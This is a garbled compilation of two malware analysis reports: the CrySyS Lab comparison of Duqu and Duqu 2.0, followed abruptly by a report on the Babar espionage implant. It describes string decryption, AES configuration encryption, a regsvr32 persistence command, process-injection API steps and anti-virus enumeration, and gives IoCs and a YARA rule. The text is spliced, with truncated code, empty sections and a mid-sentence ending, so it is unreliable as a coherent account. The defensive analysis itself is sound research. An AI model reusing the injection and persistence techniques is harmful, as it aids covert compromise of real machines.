
 

 

 

 

Authors: 

Budapest, 2015 

Boldizsár Bencsáth, Gábor Ács-Kurucz, Gábor Molnár, Gábor Vaspöri, Levente Buttyán, 
Roland Kamarás 

Findings in brief 

In October 2011, we analyzed a new threat what we named Duqu, and we showed that it has 
close relationships to the infamous Stuxnet attack.By courtesy of Kaspersky Lab, in late May 2015 we received samples about a new threat, with 
the hint that it might be related to the Duqu attacks; however, these new samples are from 
2014.We  decided to  carry  out an  individual  research  on  the  samples  with the focus on the 
connections between the original Duqu attack and the new threat, dubbed “Duqu 2.0”.After analyzing the samples received, we think, that the adversaries behind Duqu malware are 
back and active; while they modified their tools to be undetected by old methods, they also 
strongly reused codes and ideas during their recent attacks.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

2 

Table of contents 

1.Introduction ........................................................................................................................... 4 

1.1.Hashes of the analyzed samples .................................................................................... 6 

2.Similarities and differences ................................................................................................... 7 

2.1.General details ............................................................................................................... 7 

2.2.String decryption ............................................................................................................ 9 

2.3.  AES encryption of the configuration file ...................................................................... 14 

2.4.Format of the (encrypted) configuration file ............................................................... 24 

2.5.Logging functions ......................................................................................................... 26 

2.6.Command & Control communication .......................................................................... 29 

2.7.DLL imports .................................................................................................................. 33 

3.Indicators of Compromise ................................................................................................... 34 

3.1.Detection based on communications .......................................................................... 34 

3.2.Yara rules to identify .................................................................................................... 36 

4.Conclusion ........................................................................................................................... 37 

5.References ........................................................................................................................... 37 

6.Contact Information ............................................................................................................ 39 

 

 

 

 
 
 
 
 

 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

3 

1.Introduction 

Stuxnet is probably the most well-known malware of our times.Its fame stems from the facts 
that it targeted a very specific industrial facility, namely a uranium enrichment plant in Iran, it 
aimed  at  physical  destruction  of  uranium  centrifuges,  and  it  apparently  accomplished  its 
mission successfully.In addition to all these characteristics, IT security experts also appreciate 
its technical sophistication and the zero-day exploits that it used.Stuxnet was also an alarm to 
the developed world: it shed light on the capabilities of advanced attackers, and at the same 
time,  on  the  numerous  weaknesses  of  our  computing  infrastructure.Putting  these  two 
together, people started to feel hopelessly vulnerable.Yet, unfortunately, Stuxnet is not a unique example for a highly sophisticated targeted threat, 
but there are numerous other pieces of malware of similar kind, including Duqu, Flame, Regin, 
etc.Among those, Duqu is particularly interesting, not only because we discovered it back in 
2011, but because our analysis pointed out that - while Duqu's objective is different  - it has 
very  strong  similarities  to  Stuxnet  in  terms  of  architecture,  code,  and  methods  to  achieve 
stealthiness.Today,  it  is  widely  believed  within  the  IT  security  community  that  Duqu  was 
created by the same attackers who created Stuxnet.And  now  we  have  a  new  member  of  the  same  family!Last  month,  we  received  interesting 
samples  from  Kaspersky  Lab  with  a  hint  that  they  might  be  related  to  the  Duqu  samples  of 
2011;  however,  these  new  samples  are  from  2014.Our  common  understanding  was  that  it 
would be interesting to figure out whether this new threat is indeed related to the old Duqu 
attack,  and  we  in  the  CrySyS  Lab  should  try  to  focus  our  analysis  efforts  on  answering  this 
question.It is important to emphasize that we did our analysis independently from Kaspersky 
Lab: we did not read their preliminary report and they did not share any of their findings with 
us (apart from the samples that we received from them).The analysis results performed by Kaspersky Lab can be read in the following report: 

https://securelist.com/blog/research/70504/the-mystery-of-duqu-
2-0-a-sophisticated-cyberespionage-actor-returns/ 

 

 

 
 
 
 
 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

4 

In this report, we present the results of our comparative analysis of the old version of Duqu 
and  the  new  version,  codenamed  “Duqu  2.0”.We  concentrate  on  the  description  of  the 
relevant similarities and differences we have found between the two malware samples.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

5 

1.1.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

6 

2.Similarities and differences 

In the following chapter, we will discuss the most conspicuous similarities and differences we 
have found between the main modules of Duqu and Duqu 2.0.2.1.The original Duqu had a main module that was divided into two sub-modules: an outside layer 
and  an  internal  part.In  one  version,  the  internal  part  was  stored  in  a  specific  compressed 
format,  while  in  another  version,  which  we  investigated  at  a  Duqu  victim,  it  was  stored  in 
cleartext  in  a  resource  data  section  of  the  main  executable.The  Duqu  2.0  version  we 
investigated is different: everything is incorporated in the main executable, but there are still 
visible  marks  showing  that  the  malware  is  linked/compiled  from  multiple  different  parts, 
modules.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

8 

2.2.String decryption 

Some of the strings in Duqu 2.0 are obfuscated by XOR-based encryption.It simply XORs consecutive 4-byte 
blocks  of  the  encrypted  string  buffer,  given  by  its  pointer  in  the  first  parameter  of  the 
function,  with  a  fixed  4-byte  key  (“0x86F186F1”).After  the  decryption  of  all  consecutive  4-
byte blocks, the actual cleartext block is stored within the next 4 bytes of the output buffer, 
pointed  by  parameter  “a2”.The  decrypted  (cleartext)  string  is  terminated  with  a  “\0” 
character,  and  if  the  decryptor  cycle  reaches  the  end  of  the  (cleartext)  string,  the  cleartext 
string will be pointed by the address stored in output argument “a2”.A closer look at the above C code reveals that the string decryptor routine  actually has two 
parameters:  “encrstr”  and  “a2”.First,  the  decryptor  function  checks  if  the  input  buffer  (the 
pointer of the encrypted string) points to a valid memory area (i.e., it does not contain NULL 
value).After  that,  the  first  4  bytes  of  the  encrypted  string  buffer  is  XORed  with  the  key 
“0x86F186F1”  and  the  result  of  the  XOR  operation  is  stored  in  variable  “result”.The  first 
DWORD  (first  4  bytes)  of  the  output  buffer  a2  is  then  populated  by  this  resulting  value 
(*(_DWORD  *)a2  =  result;).Therefore,  the  first  4  bytes  of  the  output  buffer  will 
contain the first 4 bytes of the cleartext string.If the first two bytes (first WORD) of the current value stored in variable “result” contain ‘\0’ 
characters,  the  original  cleartext  string  was  an  empty  string  and  the  resulting  output  buffer 
will be populated by a zero value, stored on 2 bytes.If the first half of the actual decrypted 
block (“result” variable) contains something else, the decryptor routine checks the second half 
of  the  block  (“if  (  !*(_WORD  *)(a2  +  2)  )”).If  this  WORD  value  is  NULL,  then 
decryption will be ended and the output buffer will contain only one Unicode character with 
two closing ’\0’ bytes.If the first decrypted block doens’t contain zero character (generally this is the case), then the 
decryption  cycle  continues  with  the  next  4-byte  encrypted  block.The  pointer  of  the  output 
buffer is incremeted by 4 bytes to be able to store the next cleartext block (”a2 += 4;”).After  that,  the  following  4-byte  block  of  the  ”ciphertext”  will  be  decrypted  with  the  fixed 
decryption key (“0x86F186F1”).The result is then stored within the next 4 bytes of the output 
buffer.Now, the output buffer contains 2 blocks of the cleartext string.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

11 

The condition of the cycle checks if the decryption reached its end by checking the first half of 
the current decrypted block.If it did not reached the end, then the cycle continues with the 
decryption of the next input blocks, as described above.Before the decryption of each 4-byte 
”ciphertext” block, the routine also checks the second half of the previous cleartext block to 
decide whether the decoded string is ended or not.The  original  Duqu  used  a  very  similar  string  decryption  routine,  which  we  printed  in  the 
following  figure  below.We  can  see  that  this  routine  is  an  exact  copy  of  the  previously 
discussed  routine  (variable  ”a1”  is  analogous  to  ”encrstr”  argument).The  only  difference 
between  the  Duqu  2.0    and  Duqu  string  decryptor  routines  is  that  the  XOR  keys  differ  (in 
Duqu, the key is”0xB31FB31F”).We can also see that the decompiled code of Duqu contains the decryptor routine in a more 
compact  manner  (within  a  ”for”  loop  instead  of  a  ”while”),  but  the  two  routines  are 
essentially the same.For example, the two boundary checks in the Duqu 2.0 routine (”if ( 
!*(_WORD *)(a2 + 2) )” and ”while ( (_WORD)result );”) are analogous to 
the boundary check at the end of the ”for” loop in the Duqu routine (”if ( !(_WORD)v4 
||  !*(_WORD  *)(result  +  2)  )”).Similarly,  the  increment  operation  within  the 
head of the for loop in the Duqu sample (”result  +=  4”) is analogous to the  increment 
operation ”a2 += 4;” in the Duqu 2.0 sample.int __cdecl b31f_decryptor_100020E7(int a1, int a2) 

{ 

  _DWORD *v2;      // edx@1 

  int result;      // eax@2 

  unsigned int v4; // edi@6 

 

  v2 = (_DWORD *)a1; 

 

  if ( a1 ) 

  { 

    for ( result = a2; ; result += 4 ) 

    { 

      v4 = *v2 ^ 0xB31FB31F; 

      *(_DWORD *)result = v4; 

 

 
 
 
 
 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

12 

 
      if ( !(_WORD)v4 || !This configuration file is encrypted using the AES block cipher 
in CBC mode with a CTS-like (Ciphertext Stealing) encryption of the last two cleartext blocks.The format of the configuration file will be discussed in details in the next chapter.Before  the  encryption  of  the  configuration  file,  an  AES  wrapper  object  is  created.This  C++ 
object  represents  the  context  (parameters)  of  the  encryption.Therefore,  it  also  stores  the 
initialization vector (IV) of the encryption, the key of the cipher and the data to be encrypted.The structure of this object’s class can be seen in the upper part of the next screenshot: 

 

 

Figure 3 – Attributes of the AES wrapper class and an AES object 

 

As we can see, the allocated memory area of an instance of the “aeswrapper” structure (class) 
starts with a 16 bytes (128 bits) IV value (of course, the size of the IV equals the size of an AES 
input block).It is followed by a 516-byte buffer (or other unused smaller attributes) which can 
store the encryption key of the AES cipher.Size of this encryption key can be either 128, 192 
or 256 bits (16, 24 or 32 bytes).The last 4 bytes of the “aeswrapper” structure contains the 
pointer to the data to be encrypted.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

14 

In addition to the attributes (IV, encryption key, pointer to a data buffer), the “aeswrapper” 
class  also  contains methods.The  most  important  methods  are the  “encrypt”  and  “initialize” 
functions.As the name shows, the initialize method initializes the context (parameters) 
of the encryption, therefore it sets the IV, key and data members of the “aeswrapper” object.The  IV  is  generated  by  “hand”,  but  the  key  is  prepared  from  an  initial  key  using  the 
prepare_key function.The encrypt method encrypts the data in the modified CBC-CTS-
like mode.The method uses an AES encryptor function.The nth_block method of the class 
gives back a pointer to the n-th block of the data to be encrypted.Finally, the “aeswrapper” 
class  uses  the  last_block  function to perform  the  CTS-like  encryption  mechanism  at the 
end.The  function  gives  back  a  pointer  not  to  the  last  partial  (smaller  than  16  bytes)  input 
block, but to the last 16 bytes of the input data buffer.The implementation of AES  prepare_key and  encrypt methods are presumably  copied 
from function libraries.The figure above shows the structures (structures of class instances) which we identified and 
which  are  related  to  the  encryption  routine  and  the  AES  initialization,  and  the  putative 
attributes of these structures (classes).Using these structures, the disassembled code can be 
more readable.There  is  another  structure  in  addition  to  the  “aeswrapper”  class  called  “aes”  on  the 
screenshot above.An instance of this class represents an AES encryptor object.It has probably 
3 attributes: key_schedule, precomputed and iteration_count.In  the  following  table,  we  can  see  the  AES  initialization  routine  (of  the  configuration  file 
encryption)  of  the  old  Duqu  (on  the  left)  and  the  new  Duqu  2.0  sample  (on  the  right)  at 
assembly  code  level.The  decompiled  code  of  the  initialization  function  (for  both  malware 
samples)  can  be  seen  in  figure  Sample  6.The  AES  initialization  function  initializes  the 
mentioned  “aeswrapper”  object,  it  sets  the  data  buffer,  prepares  the  encryption  key,  and 
finally, generates the IV based on the magic constant.The only difference between the highlighted parts is the values of the magic 
constants (“0xDEADBABE” vs. “0x248561EF”) which are used for the generation of the 128-bit 
initialization  vectors.The  mentioned  AES  initialization  routines  (and  also  the  common 
encryption function) will be discussed later in this section in more details.Accordingly, the first block of the 
input data (”P[0]”) is XORed with a fixed initialization vector (named as ”Fixed IV” in the figure 
above).This 128-bit initialization vector (IV) differs between the old Duqu and the new Duqu 
2.0 samples.The value of this IV is generated from a magic constant, as it can be seen in the 
highlighted parts of the previous assembly code.As this magic constant is different in the old 
and new samples, the generated IV will also be different.The  result  of  the  previously  mentioned  XOR  operation  gives  the  first  input block  of  the  AES 
encryption algorithm (“AES-256” is in use).The number 256 means that the AES algorithm has 
256-bit key size.The block size of the AES cipher is constant 128 bits (16 bytes).“E[0]” is the 
first output of the block cipher, so it will be the first encrypted block (“F[0]”).Output of the block cipher (“E[0]”) is then XORed with the second input block (“P[1]”), and the 
resulting block will be encrypted with AES-256.This procedure continues until the encryption 
of the last but first block of the cleartext data.If the size of the input data is an integer multiple of the block size of AES (i.e., 128 bits), then 
the  remaining  last  two  blocks  of  the  cleartext  are  encrypted  in  the  same  manner  as  the 
previous  input  blocks.So,  in  this  case,  the  whole  encryption  routine  matches  a  simple  CBC 
mode encryption.However, if the size of the input data is not an exact multiple of the AES block size,  the last 
partial block of the input data needs padding to be completed to a full block.In case of Duqu 
2.0, the developers of the malware didn’t use padding in a traditional way.Instead, they use a 
CTS-like  (Ciphertext  Stealing)  method.The  essence  of  the  method  used  by  the  encryption 
routine is that a part of the last but first block of the input data is encrypted twice using AES.The last but first block (”P[n-1]”) of the cleartext data is XORed with the previous ciphertext 
block (”E[n-2]”) and encrypted with AES-256 as previously.The result of this operation is the 
”E[n-1]”  output  block.The  ”E[n-1]”  output  block  won’t  be  directly  used  as  the  (n-1)st 
ciphertext block.Instead, the output ”E[n-1]” is splitted into two distinct parts: ”F[n-1]” and 
another part which is then fed into the AES encryptor again.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

18 

The last cleartext partial block (”P[n]”) – which has size less than 16 bytes – is completed from 
its beginning to get a full AES input block.The data used for completing the last partial block is 
taken from the end of the previous AES output block (”E[n-1]”).The resulting block will be fed 
into  the  AES-256  cipher  in  the  last  step  of  the  encryption  process.The  output  of  the  last 
invocation of the AES cipher will be the  last ciphertext block (”F[n]”).The output of the  last 
but first invocation of the AES encryptor (”E[n-1]”) is split into two parts, and the first part of 
size  size_of_the_last_cleartext_block will be the (n-1)st ciphertext block (”F[n-
1]”).The old Duqu samples used exactly the same encryption method.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

20 

First,  the  initialization  routine  copies  the  pointer  of  the  input  data  buffer  into  the  “data” 
member of the “aeswrapper” object.The routine takes this pointer as its second parameter.The  first  parameter  is  the  pointer  (reference)  of  the  object  instance,  since  in  C++,  the  first 
(hidden)  parameter  of  a  (non-static)  class  method  is  always  the  pointer  of  the  object,  or  in 
other  words, the  “this” pointer.In  case of Duqu  2.0,  the  routine has  a  third parameter, the 
pointer to the buffer containing the key.After that, the content of the “key” buffer (which is a global buffer in the first case) is copied 
into the local “key_” buffer in both cases.Then the prepare_key method of the AES object 
prepares the final encryption key based on this key, and feeds it into the “aeswrapper” object.Invocation of the prepare_key method can also be seen in the assembly view (see Sample 
4.),  the  method  is  referred  by  the  name  AES1_sub_2F9B1  in  case  of  Duqu  and 
AES_1_sub_1001690A  in  case  of  Duqu  2.0.In  the  Duqu  2.0  case,  the  function  has  one 
more parameter, as this can also be seen in the assembly view, and the length of the AES key 
is chosen as 256 bits.Finally, the remaining part of the code initializes the IV member of “aeswrapper” object.Every 
byte  of  the  IV  is  generated  by  XORing  the  index  of  the  actual  byte  with  a  magic  constant 
(“0xDEADBABE”  and  “0x248561EF”,  respectively,  in  the  two  cases).Byte  index  starts  from 
zero.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

22 

In case of Duqu, the prepare_key function assumes that the key is always 256 bits, while in 
case  of  Duqu  2.0,  the  prepare_key  function  takes  the  key  length  as  an  argument.Key 
length can be 128, 192 or 256 bits.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

23 

2.4.Format of the (encrypted) configuration file 

Under the encryption layer (which is identical in the new and old samples as described in the 
previous section), the configuration file format of the new Duqu 2.0 samples is very similar to 
the old Duqu config file format.For an overview, see Figure 5 below.Figure 5 – File format found in Duqu (first diagram) and Duqu 2.0 (second diagram) 

(Rectangles always denote little endian 4 byte integers if not stated otherwise) 

 

The  format  is  designed  to  hold  key-value  pairs.The  keys  are  always  4-byte  long,  and  the 
values can be of arbitrary size.We believe that the keys are timestamps and the values are 
configuration  entries,  although  the  file  format  could  hold  any  other  similarly  structured 
information (e.g.configurations).The old file format begins with 4 bytes whose value is undefined.In the serialization process, 
it is read from an uninitialized buffer, and it is ignored in the deserialization process.The new 
file format does not have such a beginning byte sequence.The main part of the file format is surrounded by 4 signature bytes at the beginning and at the 
end.The byte sequence in the old Duqu file format is 0x839172FF, and in the new Duqu 2.0 
version, it is 0x7749CB4D.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

24 

In  both  cases,  the  next  integer  indicates  the  number  of  entries,  followed  by  the  entries 
themselves.Each entry begins with a 4-byte key, and then the value.In the new format, the value always 
begins with 13 bytes (that can be logically divided into four 4 byte integers and a 1 byte value: 
4+4+1+4+4), but in the old format, this is missing.Furthermore, the value contains a variable 
size part in both formats.This is a length prefixed buffer that can hold arbitrary data.In essence, the only difference between the Duqu and the Duqu 2.0 config file formats is the 
presence  of  the  undefined  4  bytes  at  the  beginning  of  the  file  in  the  old  version,  and  the 
presence of the 13 additional value bytes in the new version.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

25 

2.5.Logging functions 

We’ve identified a characteristic logging function that is present in both Duqu and Duqu 2.0, 
and is used extensively in the networking (mainly HTTP handling) part of the code.The logging 
function itself is identical, and the data structure used for storing log entries is very similar.The Duqu version of the data structure has embedded function pointers, while the  Duqu 2.0 
version  uses  a  virtual  function  table  like  structure.The  main  difference  from  a  C++  virtual 
function  table  is  that  the  pointer  to  the  table  is  the  last  field  of  the  associated  structure 
instead of the first field (see Figure 6).In general, change in the coding style can be seen all over the code.While Duqu uses object 
oriented  style  that  is  similar,  but  not  identical  to  what  C++  compilers  do,  Duqu  2.0  moved 
mainly  to  “real”  C++,  but  there  are  still  deviations  from  the  standard  C++  style  (like  the 
previously function table).Figure 6 – Log entry structure and the associated virtual function table in Duqu and Duqu 2.0 

 

 

 

 
 
 
 
 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

 

26 

Both the Duqu and Duqu 2.0 avoids storing the messages logged through this function.In both 
codebase,  a  “handle_log_entry”  function  is  called  after  creating  the  log entry  structure,  but 
this  function  throws  the  object  away  (frees  the  memory)  and  does  not  print  or  save  it.The 
authors  probably  used  C/C++  macros  to  avoid  detailed  logging  in  release  builds,  but  in  this 
case we still see the logging function invocation.In this case, the macro was probably placed 
in the function that should have printed the log message (handle_log_entry), and since this is 
a virtual function, the compiler could not optimize out the function invocations directly.The  logging  function  is  called  equal  times  in  the  Duqu  and  the  Duqu  2.0  samples,  and  the 
invocation  is  always  very  similar  (see  Figure  7).The  arguments  are  usually  not  strings 
describing the event directly, but 4 byte magic numbers.The logging function is invoked equal 
times, and the magic numbers are almost always identical in Duqu and Duqu 2.0.Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

27 

Figure 7 – References to the logger function in Duqu and Duqu 2.0, and one of the invocations 

 

 

 
 
 
 
 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

 

 

28 

2.6.Command & Control communication 

The network communication methods used by Duqu 2.0 are described in the following list.DLL imports 

Duqu  2.0  uses  more  than  one  method  to  import  functions  from  DLLs.One  of  the  methods 
utilizes a hash method to represent function names as 4 byte integers.It iterates through all 
importable  function  and  finds  the  one  whose  function  name  hash  matches  the  given  hash.This hash function uses a magic number.A very similar import method and hash function is 
used  in  Duqu  and  Duqu  2.0  although  the  magic  numbers  are  different:  0x86F186F1  and 
0xB31FB31F.Note that even the inner structure of the magic numbers are similar (2x2 bytes).Sample 8 – Hash function used for imports in Duqu and Duqu 2.0 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

 

33 

3.Indicators of Compromise 

3.1.Detection based on communications 

The malware can transmit information through HTTP traffic.It is most likely that one or more 
infected  computers  can  be  proxy  points  towards  the  attacker,  meaning  that  other  infected 
computers communicate with these proxies.These proxies can act as HTTP or HTTPS servers.For HTTPS, a self signed certificate is created by the malware itself.(Most likely by contacting 
gpl3.selfsigned.org).The Common Name (CN) field seems to be “*” in the created certificate.During data transfer, the malware uses  <5  random  numbers>.gif for file name and a 
843-byte GIF file + additional random bytes.The transmissions may be protected by AES.One  possible  way  to  detect  such  transmission  (if  cleartext  traffic  is  somehow  available)  to 
detect the actual 843-byte GIF file.For the known two samples, this GIF portion was identical.Yara rules to identify 

For the main binary of the malware, we propose the following rules for detection: 

 

 

 

 

 

 
 
 
 
 

 
rule duqu2 
{ 
 
strings: 
$a = { 0F B6 C8 8B C1 0F AF C9 83 E0 ??C1 E0 ??05 ????????0F 
AF D8 8B ??????33 D9 } 
$b = { 0F 84 ????????0F B7 06 B9 ????????33 C1 3D ????????0F 85 ????????8B } 
 
condition: 
any of them 
 
} 

Sample 11 – Yara rules for detection of Duqu 2.0 

 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

36 

4.Conclusion 

We’ve made an initial analysis to prove our claims that there is a strong connection between 
Duqu and Duqu 2.0 malwares.Our main goal was to highlight the most striking similarities and 
differences  between  the  samples.Similarities  shows  that  the  developers  of  Duqu  2.0  have 
reused  the  code  basis  of  the  old  Duqu  specimens  and  the  differences  found  in  the  binaries 
indicates that the developers of Duqu have modified their tools to avoid detections.5.Contact Information 

Questions and comments are welcome.The corresponding author is  
Dr. Boldizsár Bencsáth   
bencsath@crysys.hu 
 
Laboratory of Cryptography and System Security  
CrySyS – http://www.crysys.hu/ 
Budapest University of Technology and Economics 
Department of Telecommunications 
1117 Magyar Tudósok Krt.2.Budapest, Hungary 
 
GPG BENCSATH Boldizsar <boldi@crysys.hu> 
Key ID 0x64CF6EFB 
Fingerprint 286C A586 6311 36B3 2F94 B905 AFB7 C688 64CF 6EFB 
 

 

 
 
 
 
 

 
 
Laboratory of Cryptography and System Security (CrySyS) 
Budapest University of Technology and Economics 
www.crysys.hu 

 

39You guys rock \m/

Comments or inquiries please direct to Marion Marschalek (0xF372F2CA).Babar and the related crowd of animalesque malware will be presented at SyScan'15 conference
(https://www.syscan.org/) in March 2015.No elephants were harmed in the making of this report.Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.This work is licensed under a 

page | 2

CONTENT

1.SHOOTING ELEPHANTS....................................................................................4
2.MISCREANT'S DROPPER..................................................................................5
3.BEYOND BABAR.............................................................................................16
5.RESOURCES.................................................................................................... 18
6.APPENDICES..................................................................................................19

page | 3

1.SHOOTING ELEPHANTS

Subject of this analysis is a fascinating piece of malware, which invades Windows desktop 
machines and aims at.. well, all the things.The analyzed malware consists of a dropper and an 
implant, which invades Windows processes to steal data from instant messengers, softphones, 
browsers and office applications.A fully blown espionage kit, so to say, sophisticated almost.The 
implant is able to hook APIs of interest in dedicated remote processes, to steal data on the fly.More interesting than the malware itself though is the path to the associated symbol file, which 
appears embedded in the dropper.The analyzed malware samples come with the internal project 
name 'Babar64'.Illustration 1 | The .pdb path embedded in Babar's dropper

The myth of Babar has been around for a while in the intelligence community.Questions have 
been raised since Le Monde published an article on Babar in 2014 [1] and were recently fuelled by 
a leaked government presentation found among a stash of documents published in January by 
Spiegel [2].The leaked document was authored by the Communications Security Establishment 
Canada (CSEC) and reports about a potential nation state attack involving malware named Babar.The actor behind the attacks is assumed to be French inteligence.Assumptions are based on 
certain binary attributes, language and location of infrastructure as well as targets.The binaries at hand fit well with the description CSEC provides, although it is quite clear they are a
newer version from what CSEC had uncovered around 2009.It is not clear whether the compilation
timestamps are falsified, but an earlier compilation time than the actual stamp seems unlikely.Doubtlessly though, the Babar binaries match with a malware strain representing itself as Bunny, 
as well as a family dubbed NBOT or TFC.page | 4

2.MISCREANT'S DROPPER

The dropper operates straight forward; it fetches the encrypted DLL from its own binary from 
outside its resource section, decrypts it and hides it in the file system.Then it goes on to load the 
DLL using Windows regsvr32.exe.To achieve this it spawns a dedicated process with the command 
line '"regsvr32.exe" /s /n /i "%APPDATA%\%DLLNAME%"'.The DLL name is random but legitimately looking and hardcoded for a specific dropper.It is also 
stored as encrypted string in the binary, and has been seen to decrypt to either 'perf585.dll' or 
'dump21cb.dll' depending on the dropper.The encryption algorithm used is AES (Advanced Encryption Standard) with 128-bit keys.The keys 
used for decryption are '20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C' for the implant 
filename and 'A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15' for decrypting the binary.AES is 
the encryption algorithm of choice throughout the dropper and its implant's operations.Interestingly, the Babar dropper as well as the implant show a similar method of API name 
obfuscation as the Bunny malware and samples from the NBOT family.Dedicated APIs are loaded 
through a resolution function, which searches for library exports by comparing hashes of the 
export names with a given hash.For the Babar project though the attackers used an adapted 
version of SHA-1, as opposed to the simple XOR/ROL hash algorithm which was used in the Bunny 
project.After infection the dropper executes a separate command line through spawning a cmd.exe 
process, which is instructed to wait for 1 second before deleting the dropper binary on disk.This 
way the malware reduces forensic artefacts, staying behind after infection.Curiously though, the 
regsvr32.exe process used to load the dropped implant remains running.This way Babar leaves a 
visible process on the process list during execution.As the project name 'Babar64' suggests, dropper and implant are designed to work on 32-bit and 
on 64-bit Windows versions.However, process hooking and injection can only affect 32-bit 
processes due to the bitness of the implant itself.page | 5

3.MISCREANT'S IMPLANT

Babar's implant is a 32-bit DLL written in C++, which upon start injects itself to running processes 
and invades desktop applications by applying a global Windows hooks.The implant is capable of 
logging keystrokes, capture screen shots, spy on installed softphones and instant messengers next 
to a list of simpler espionage tricks.Babar is a fully blown espionage tool, built to excessively spy 
on the user's activity on an infected machine.The DLL dropped by Babar is placed into the application data folder, along with a directory named 
'MSI' where the runtime data will be stored.Babar operates through multiple instances, by 
injecting its DLL to a maximum of three desktop processes.This is achieved by loading the Babar 
DLL to remote processes through a mapped memory object.Apart from that, Babar comes with a userland rootkit component which applies global Windows 
hooks to invade all processes on its desktop.This way Babar can install API hooks for various APIs 
via Windows Detours technique to actively steal data from arbitrary processes.3.1 ANTI-ANALYSIS MEASURES

Babar's anti-analysis measures are sparse.It is not protected by a runtime packer or crypter, it 
does not have sandbox detection or anti-debugging measures, most character strings are shown in 
clear-text.Babar does show the same obscure treatment for installed anti-virus products as the Bunny 
malware though.Babar also enumerates the Windows Management Instrumentation for installed 
AV solutions, while the exact use of this information is not yet known.We do suspect large 
portions of the product enumeration to be based on the exact same source code as the module 
Bunny used.Illustration 2 | Querying anti-virus products installed on the machine

The enumeration function issues the commands „SELECT * FROM AntiVirusProduct“ and retrieves 
attributes such as 'productState', 'DisplayName', 'VersionNumber' and 'productUptoDate'.The anti-virus solutions searched for are again identified by 256-bit SHA hashes.Only some of the 

page | 6

hashes could be mapped to known names of anti-virus solutions.Selected APIs are 
identified by hashes, which are used to load the APIs dynamically at runtime.The hashes are 
hardcoded within the binary, and will be compared to hashed library exports by the API resolution 
routine.The hashing algorithm is different from the simple XOR/ROL technique Bunny uses.It seems to be 
based on SHA-1, but generates 32-bit hashes instead of the standard 160-bit length.What Bunny, Babar and NBOT all have in common though is that the obfuscation technique is easy 
to break and only applied to a subset of APIs.As an anti-analysis trick this is considerably useless, it
does make sense though to trick malware detection solutions which apply heuristics based on 
static analysis of API calls.This becomes evident when looking at the list of Babar's obfuscated API 
names, which includes RegisterRawInputDevices, GetRawInputData, GetClipboardData or 
DirectSoundCaptureCreate.3.2 BABAR CAME TO STAY

The startup routine of the Babar implant will create a registry key under 
'[HKU]\..\CurrentVersion\Run' to assure persistence.The key is named 'MSSecurity' and executes 
the exact same command line as the infector, every time the system boots - '"regsvr32.exe" /s /n /i 
"%APPDATA%\%DLLNAME%"'.At system boot time the regsvr32.exe process will start, load the 
Babar DLL and thus 'deploy' the malware to various legitimate processes.As opposed to 
persistence, Babar also implements functionality to uninstall itself from the affected system.Interesting again, same as during infection, the regsvr32.exe process remains running even after 
Babar is readily set up.3.3 CONFIGURATION DATA

During initialization Babar loads and decrypts a set of configuration parameters which are 
appended to the DLL's relocation section.The additional configuration consists of  a
set of local attributes and a set of values derived from the Windows environment.The attributes 
are dynamically generated or requested at runtime and not stored in memory.This for once is a resilience measure, so if the initially infected process stops 
running the malware remains in memory through additional instances.On the other hand it is 
practically a load balancing measure.The C&C communication module is located in an export of 
the DLL, which will be executed through a remote thread, injected like the child processes, via a 
memory-mapped file.The process infection is achieved by mapping a shared object into the victim's process space and 
invoking a function stub as remote thread.The steps being taken are:

• MapViewOfFile – mapped memory shared with the child instance
• OpenProcess – obtaining a handle to the chosen victim process
•
• WriteProcessMemory – write function stub to remote memory
CreateRemoteThread – execute function stub as remote process
•

VirtualAllocEx – allocate space in remote memory

The function stub will then go on to load the Babar DLL through LoadLibraryA and execute one of 
its exports, as indicated in the shared memory.The mapped object contains name and path to the 
malicious DLL, the name of the pipe being used for communication between the instances, the 
name of the export from the DLL to be called as well as information about instances already 
running.For picking a process to infect the malware randomly picks one from a list of prospects.These have
to be 32-bit processes, not already infected and not among a list of processes to avoid such as 
winlogon.exe, explorer.exe, cmd.exe or regsvr32.exe.This way Babar always keeps three instances in memory.The first one to start up will be the 'main 
instance'.If any of the instances dies, a new third instance will be created.If the main instance dies
the oldest child will take over.For inter process communication Babar uses named pipes.The main instance generates a random 
GUID which is used as name and passed to child instances.At the same time, the main instance 
creates six named pipes using the very same GUID.These pipes represent the server side for child 
instances, and also the point to connect to for hooks Babar installs to spy on several system APIs.page | 9

Illustration 3 | Named pipes opened by the main instance

3.5 FUNCTIONALITY

The spying activities are performed either through the Babar instance locally or via a global 
